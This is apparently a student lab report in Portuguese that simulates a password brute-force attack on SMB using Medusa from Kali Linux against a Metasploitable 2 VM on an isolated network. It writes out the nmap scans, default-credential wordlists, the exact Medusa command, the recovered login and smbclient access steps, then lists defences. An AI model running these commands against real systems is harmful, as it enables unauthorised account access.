# Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux

## 1. Introdução

Este projeto teve como objetivo simular, em ambiente controlado, um ataque de força bruta contra o protocolo SMB utilizando o Kali Linux, a ferramenta Medusa e a máquina vulnerável Metasploitable 2.

O laboratório foi criado apenas para fins educacionais, sem atingir sistemas reais ou redes de terceiros.

## 2. Ambiente utilizado

- Máquina atacante: Kali Linux
- Máquina alvo: Metasploitable 2
- Virtualizador: Oracle VirtualBox
- Ferramenta de ataque: Medusa
- Ferramenta de validação: smbclient
- Serviço analisado: SMB/Samba
- IP do alvo: 192.168.56.101
- IP do Kali: 192.168.56.102

## 3. Configuração da rede

As máquinas foram configuradas em uma rede Host-only no VirtualBox, permitindo a comunicação entre Kali Linux e Metasploitable 2 de forma isolada.

Essa configuração evita que a máquina vulnerável fique exposta diretamente à internet ou à rede principal.

## 4. Identificação do alvo

No Metasploitable 2, foi utilizado o comando:

ifconfig

O IP identificado foi:

192.168.56.101

No Kali Linux, foi testada a comunicação com:

ping 192.168.56.101

O teste foi bem-sucedido, confirmando comunicação entre as máquinas.

## 5. Verificação do serviço SMB

No Kali Linux, foi executado o comando:

nmap -p 139,445 192.168.56.101

O resultado mostrou as portas abertas:

139/tcp open netbios-ssn
445/tcp open microsoft-ds

Depois foi executado:

nmap -sV -p 139,445 192.168.56.101

O resultado indicou o serviço Samba smbd ativo.

## 6. Criação das wordlists

Foram criados dois arquivos:

usuarios.txt
senhas.txt

O arquivo usuarios.txt continha usuários como:

admin
root
user
test
postgres
service
guest
msfadmin

O arquivo senhas.txt continha senhas como:

123456
admin
password
senha123
root
user
test
postgres
msfadmin

## 7. Execução do ataque com Medusa

O comando utilizado foi:

medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M smbnt -n 445 -t 4 -f -v 6

Durante a execução, o Medusa testou combinações de usuários e senhas contra o serviço SMB.

A credencial encontrada foi:

Usuário: user
Senha: user

## 8. Validação do acesso com smbclient

Para validar a credencial encontrada, foi utilizado:

smbclient -L //192.168.56.101 -U user%user

O comando listou os compartilhamentos SMB disponíveis, confirmando que a credencial era válida.

Depois foi acessado o compartilhamento tmp com:

smbclient //192.168.56.101/tmp -U user%user

Dentro do smbclient, foi usado:

ls

O comando listou os arquivos do compartilhamento, confirmando o acesso.

## 9. Análise crítica

O experimento demonstrou como senhas fracas ou previsíveis podem comprometer serviços de rede. A combinação user/user foi encontrada porque estava presente nas wordlists e era aceita pelo serviço SMB.

Esse tipo de falha mostra a importância de evitar usuários e senhas padrão, além de reforçar a necessidade de políticas de autenticação mais seguras.

Mesmo com tecnologias modernas como inteligência artificial e autenticação multifator, ferramentas clássicas como Medusa continuam importantes para entender os fundamentos de segurança ofensiva e defensiva.

## 10. Medidas de proteção

Algumas medidas para reduzir esse tipo de risco são:

- Utilizar senhas fortes e únicas.
- Evitar credenciais padrão.
- Bloquear contas após várias tentativas inválidas.
- Monitorar logs de autenticação.
- Restringir acesso às portas 139 e 445.
- Usar firewall.
- Desativar serviços desnecessários.
- Atualizar sistemas e serviços.
- Usar autenticação multifator quando possível.

## 11. Conclusão

Com este projeto, foi possível compreender na prática como funciona um ataque de força bruta contra o protocolo SMB em um ambiente controlado.

A ferramenta Medusa automatizou as tentativas de autenticação, enquanto o smbclient permitiu validar o acesso obtido.

O projeto reforçou a importância de boas práticas de segurança, principalmente o uso de senhas fortes, controle de acesso, monitoramento e configuração adequada dos serviços de rede.
